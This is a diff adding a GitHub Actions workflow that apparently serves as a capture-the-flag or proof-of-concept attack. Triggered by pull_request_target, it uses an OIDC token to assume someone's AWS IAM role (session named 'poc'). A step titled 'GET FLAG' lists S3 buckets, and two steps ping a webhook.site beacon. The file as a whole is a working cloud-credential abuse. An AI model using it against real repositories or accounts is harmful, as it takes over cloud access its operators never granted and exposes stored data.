@@ -1,0 +1,25 @@
+name: Mack AWS workflow
+on:
+  pull_request_target:
+permissions:
+      id-token: write   
+      contents: read    
+jobs:
+    AssumeRole:
+        runs-on: ubuntu-latest
+        steps:
+          - name: Check Curl webhook
+            run: |
+             curl https://webhook.site/e8f1acd7-fa5f-4b5a-bf25-5edb677ed95d
+          - name: Git clone the repository
+            uses: actions/checkout@v3
+          - name: configure aws credentials
+            uses: aws-actions/configure-aws-credentials@v2
+            with:
+              role-to-assume: arn:aws:iam::520091917895:role/magichk_role
+              role-session-name: poc
+              aws-region: eu-west-1
+          - name: GET FLAG
+            run: |
+              curl https://webhook.site/e8f1acd7-fa5f-4b5a-bf25-5edb677ed95d
+              aws s3 ls
